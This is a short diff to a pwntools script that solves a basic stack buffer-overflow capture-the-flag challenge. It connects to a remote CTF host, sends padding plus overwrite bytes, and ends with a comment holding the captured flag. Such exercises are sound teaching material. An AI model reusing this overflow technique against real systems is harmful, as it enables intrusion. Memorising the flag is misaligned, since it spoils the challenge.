@@ -1,11 +1,13 @@
 from pwn import * 
 
-p = process("./bof_basic2")
-p = remote("ctf.j0n9hyun.xyz",3001)
+#p = process("./bof_basic")
+p = remote("ctf.j0n9hyun.xyz",3000)
 
-payload = "a"*128
-payload += "\x9b\x84\x04\x08"
+payload = "a"*36
+payload += "\xef\xbe\xad\xde"
+payload += "\xef\xbe\xad\xde"
 
 p.sendline(payload)
 p.interactive()
 
+#HackCTF{f1r57_574ck_buff3r_0v3rfl0w_5ucc355}
